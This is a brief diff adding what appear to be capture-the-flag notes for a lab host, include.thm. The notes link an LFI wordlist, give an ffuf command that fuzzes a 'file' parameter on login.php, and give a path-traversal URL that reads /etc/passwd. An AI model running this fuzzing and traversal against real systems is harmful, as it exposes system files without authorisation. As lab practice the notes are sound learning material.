@@ -1,0 +1,8 @@
+https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
+(wordlist)
+
+ffuf -u http://include.thm:50000/login.php?file=FUZZ -w /usr/share/seclists/Fuzzing/LFI-Jhaddix.txt
+
+if vulnerable, try:
+http://include.thm:50000/login.php?file=../../../../../etc/passwd
+
